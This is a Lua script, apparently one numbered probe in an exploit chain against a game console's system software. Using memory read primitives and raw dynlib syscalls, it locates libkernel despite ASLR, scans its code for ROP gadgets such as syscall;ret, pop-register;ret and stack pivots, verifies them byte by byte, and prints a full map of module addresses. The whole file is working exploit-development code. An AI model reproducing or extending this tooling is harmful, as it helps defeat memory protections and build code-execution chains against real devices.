-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41p: dump libkernel text segment and find ROP gadgets
-- From 41o: dynlib_get_info(0x2001) = libkernel.sprx
--   text base = 0x8_112BC000, text size = 0x48000
--   data base = 0x8_11304000, data size = 0x20000
-- We search for: syscall; ret (0F 05 C3), pop rdi; ret (5F C3),
-- pop rsi; ret (5E C3), pop rdx; ret (5A C3), pop rcx; ret (59 C3),
-- pop rax; ret (58 C3), pop r8; ret (41 58 C3), ret (C3),
-- stack pivot (xchg rsp,X / mov rsp,X), jmp rax (FF E0)

print("=== PROBE 41p: LIBKERNEL GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

--------------------------------------------------------------------
-- STEP 1: Re-derive libkernel base (ASLR changes per run)
--------------------------------------------------------------------
print("--- STEP 1: LOCATE LIBKERNEL ---")

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)

local num_h = safe_rd(num_buf)
print("loaded modules: " .. (num_h or "?"))

-- find libkernel handle (was 0x2001 last run, but check all)
local libk_handle = nil
local libk_text_base = nil
local libk_text_size = nil
local libk_data_base = nil

local info_buf = memory.alloc(0x200)

for i = 0, math.min((num_h or 0) - 1, 63) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
        safe_wd(info_buf, 0x160)

        local ok_gi = pcall(function()
            sc_dynlib_get_info(uint64(h), info_buf)
        end)
        if ok_gi then
            -- check name at +08 for "libkernel" (6C69626B 65726E65 6C)
            local n1 = safe_rd(info_buf + 0x08)
            local n2 = safe_rd(info_buf + 0x0C)
            -- "libk" = 0x6B62696C, "erne" = 0x656E7265
            if n1 == 0x6B62696C and n2 == 0x656E7265 then
                libk_handle = h

                -- text segment: +108=base(lo), +10C=base(hi), +110=size(lo)
                local tbl = safe_rd(info_buf + 0x108)
                local tbh = safe_rd(info_buf + 0x10C)
                local tsl = safe_rd(info_buf + 0x110)
                local tsh = safe_rd(info_buf + 0x114)

                if tbl and tbh then
                    local base_hex = string.format("0x%X%08X", tbh, tbl)
                    libk_text_base = uint64(base_hex)
                    libk_text_size = tsl or 0
                    print(string.format("libkernel handle: 0x%X", h))
                    print(string.format("text base: %s", base_hex))
                    print(string.format("text size: 0x%X", libk_text_size))
                end

                -- data segment: +118=base, +120=size
                local dbl = safe_rd(info_buf + 0x118)
                local dbh = safe_rd(info_buf + 0x11C)
                if dbl and dbh then
                    local dbase_hex = string.format("0x%X%08X", dbh, dbl)
                    libk_data_base = uint64(dbase_hex)
                    print(string.format("data base: %s", dbase_hex))
                end
                break
            end
        end
    end
end

if not libk_text_base then
    print("FAILED to find libkernel")
    print("=== PROBE 41p FAILED ===")
    return
end
print("")

-- verify we can read the text segment
-- safe_rd takes a number or uint64; libk_text_base is uint64
local test_dw = safe_rd(libk_text_base)
if test_dw then
    print("text segment readable, first dword: " .. string.format("0x%08X", test_dw))
else
    print("text NOT readable via dword, trying qword...")
    local tq = safe_rq(libk_text_base)
    if tq then
        print("readable via qword: " .. dump_qword(tq))
    else
        print("FAULT — cannot read libkernel text")
        -- try reading the first byte
        local tb = safe_rb(libk_text_base)
        if tb then
            print("but readable via byte: " .. string.format("0x%02X", tb))
        else
            print("=== PROBE 41p FAILED ===")
            return
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Scan for gadgets
-- Read 4 bytes at a time (dword), check byte patterns
-- Limit: scan first 0x20000 bytes to stay within loader budget
--------------------------------------------------------------------
print("--- STEP 2: GADGET SCAN ---")

local gadgets = {
    syscall_ret = {},    -- 0F 05 C3
    pop_rdi_ret = {},    -- 5F C3
    pop_rsi_ret = {},    -- 5E C3
    pop_rdx_ret = {},    -- 5A C3
    pop_rcx_ret = {},    -- 59 C3
    pop_rax_ret = {},    -- 58 C3
    pop_r8_ret = {},     -- 41 58 C3
    pop_rbp_ret = {},    -- 5D C3
    pop_rsp_ret = {},    -- 5C C3
    ret = {},            -- C3 (standalone)
    jmp_rax = {},        -- FF E0
    call_rax = {},       -- FF D0
    xchg_rsp = {},       -- 48 94 (xchg rsp,rax) or 48 87 E0
    mov_rdi_rax = {},    -- 48 89 C7 (mov rdi,rax)
    leave_ret = {},      -- C9 C3
}

-- scan limit: 0x20000 bytes in steps of 1 byte via dword reads
-- read a dword every 1 byte is too slow. Instead read dwords every 4 bytes
-- and check all 4 byte positions within each dword
local scan_size = 0x20000
local scan_step = 4
local reads = 0
local max_reads = 8192  -- ~32KB in dword reads

for off = 0, scan_size - 4, scan_step do
    if reads >= max_reads then break end
    local dw = safe_rd(libk_text_base + off)
    if dw == nil then break end
    reads = reads + 1

    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- check within this dword
    -- syscall; ret = 0F 05 C3 (3 bytes, could span b0-b2 or b1-b3)
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
        gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
        gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off + 1
    end

    -- pop rdi; ret = 5F C3
    if b0 == 0x5F and b1 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off
    end
    if b1 == 0x5F and b2 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off + 1
    end
    if b2 == 0x5F and b3 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off + 2
    end

    -- pop rsi; ret = 5E C3
    if b0 == 0x5E and b1 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off
    end
    if b1 == 0x5E and b2 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off + 1
    end
    if b2 == 0x5E and b3 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off + 2
    end

    -- pop rdx; ret = 5A C3
    if b0 == 0x5A and b1 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off
    end
    if b1 == 0x5A and b2 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off + 1
    end
    if b2 == 0x5A and b3 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off + 2
    end

    -- pop rcx; ret = 59 C3
    if b0 == 0x59 and b1 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off
    end
    if b1 == 0x59 and b2 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off + 1
    end
    if b2 == 0x59 and b3 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off + 2
    end

    -- pop rax; ret = 58 C3
    if b0 == 0x58 and b1 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off
    end
    if b1 == 0x58 and b2 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off + 1
    end
    if b2 == 0x58 and b3 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off + 2
    end

    -- pop rbp; ret = 5D C3
    if b0 == 0x5D and b1 == 0xC3 then
        gadgets.pop_rbp_ret[#gadgets.pop_rbp_ret + 1] = off
    end
    if b1 == 0x5D and b2 == 0xC3 then
        gadgets.pop_rbp_ret[#gadgets.pop_rbp_ret + 1] = off + 1
    end

    -- pop r8; ret = 41 58 C3
    if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then
        gadgets.pop_r8_ret[#gadgets.pop_r8_ret + 1] = off
    end
    if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 then
        gadgets.pop_r8_ret[#gadgets.pop_r8_ret + 1] = off + 1
    end

    -- leave; ret = C9 C3
    if b0 == 0xC9 and b1 == 0xC3 then
        gadgets.leave_ret[#gadgets.leave_ret + 1] = off
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        gadgets.leave_ret[#gadgets.leave_ret + 1] = off + 1
    end

    -- jmp rax = FF E0
    if b0 == 0xFF and b1 == 0xE0 then
        gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off
    end
    if b1 == 0xFF and b2 == 0xE0 then
        gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off + 1
    end

    -- call rax = FF D0
    if b0 == 0xFF and b1 == 0xD0 then
        gadgets.call_rax[#gadgets.call_rax + 1] = off
    end
    if b1 == 0xFF and b2 == 0xD0 then
        gadgets.call_rax[#gadgets.call_rax + 1] = off + 1
    end

    -- mov rdi,rax = 48 89 C7
    if b0 == 0x48 and b1 == 0x89 and b2 == 0xC7 then
        gadgets.mov_rdi_rax[#gadgets.mov_rdi_rax + 1] = off
    end
    if b1 == 0x48 and b2 == 0x89 and b3 == 0xC7 then
        gadgets.mov_rdi_rax[#gadgets.mov_rdi_rax + 1] = off + 1
    end

    -- xchg rsp,rax = 48 94 or 48 87 E4/C4
    if b0 == 0x48 and b1 == 0x94 then
        gadgets.xchg_rsp[#gadgets.xchg_rsp + 1] = off
    end
    if b0 == 0x48 and b1 == 0x87 and (b2 == 0xE4 or b2 == 0xC4) then
        gadgets.xchg_rsp[#gadgets.xchg_rsp + 1] = off
    end

    -- standalone ret
    if b0 == 0xC3 and off > 0 then
        -- only record first few
        if #gadgets.ret < 3 then
            gadgets.ret[#gadgets.ret + 1] = off
        end
    end
end

print("scanned " .. reads .. " dwords (" .. (reads * 4) .. " bytes)")
print("")

--------------------------------------------------------------------
-- STEP 3: Report findings
--------------------------------------------------------------------
print("--- STEP 3: GADGET CATALOG ---")

local function report(name, list, max_show)
    max_show = max_show or 3
    print(string.format("  %-20s: %d found", name, #list))
    for j = 1, math.min(#list, max_show) do
        print(string.format("    +0x%04X (libkernel+0x%X)", list[j], list[j]))
    end
end

report("syscall; ret", gadgets.syscall_ret)
report("pop rdi; ret", gadgets.pop_rdi_ret)
report("pop rsi; ret", gadgets.pop_rsi_ret)
report("pop rdx; ret", gadgets.pop_rdx_ret)
report("pop rcx; ret", gadgets.pop_rcx_ret)
report("pop rax; ret", gadgets.pop_rax_ret)
report("pop r8; ret", gadgets.pop_r8_ret)
report("pop rbp; ret", gadgets.pop_rbp_ret)
report("leave; ret", gadgets.leave_ret)
report("jmp rax", gadgets.jmp_rax)
report("call rax", gadgets.call_rax)
report("mov rdi,rax", gadgets.mov_rdi_rax)
report("xchg rsp,*", gadgets.xchg_rsp)
report("ret", gadgets.ret, 1)
print("")

--------------------------------------------------------------------
-- STEP 4: Verify first syscall;ret gadget by reading its bytes
--------------------------------------------------------------------
print("--- STEP 4: VERIFY GADGETS ---")
if #gadgets.syscall_ret > 0 then
    local off = gadgets.syscall_ret[1]
    print("  verifying syscall;ret at +" .. string.format("0x%X", off))
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    local b2 = safe_rb(libk_text_base + off + 2)
    print(string.format("  bytes: %02X %02X %02X %s",
        b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "MISMATCH"))

    -- also read context: 8 bytes before and after
    print("  context:")
    for ctx = -8, 8, 4 do
        local d = safe_rd(libk_text_base + off + ctx)
        if d then
            print(string.format("    [%+d] %08X", ctx, d))
        end
    end
end

if #gadgets.pop_rdi_ret > 0 then
    local off = gadgets.pop_rdi_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rdi;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5F and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rsi_ret > 0 then
    local off = gadgets.pop_rsi_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rsi;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5E and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rdx_ret > 0 then
    local off = gadgets.pop_rdx_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rdx;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5A and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rax_ret > 0 then
    local off = gadgets.pop_rax_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rax;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x58 and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end
print("")

--------------------------------------------------------------------
-- STEP 5: Also dump all module bases for full ASLR map
--------------------------------------------------------------------
print("--- STEP 5: FULL MODULE MAP ---")
for i = 0, math.min((num_h or 0) - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off2 = 0, 0x1F8, 4 do safe_wd(info_buf + off2, 0) end
        safe_wd(info_buf, 0x160)
        local ok2 = pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        if ok2 then
            -- read name (up to 32 chars from +08)
            local name_bytes = {}
            for nb = 0, 31 do
                local c = safe_rb(info_buf + 0x08 + nb)
                if c and c > 0 and c < 128 then
                    name_bytes[#name_bytes + 1] = string.char(c)
                else
                    break
                end
            end
            local name = table.concat(name_bytes)

            local tbl2 = safe_rd(info_buf + 0x108)
            local tbh2 = safe_rd(info_buf + 0x10C)
            local tsl2 = safe_rd(info_buf + 0x110)

            if tbl2 and tbh2 then
                print(string.format("  [%2d] 0x%04X  %08X_%08X  sz=0x%05X  %s",
                    i, h, tbh2, tbl2, tsl2 or 0, name))
            end
        end
    end
end
print("")

print("=== PROBE 41p COMPLETE ===")
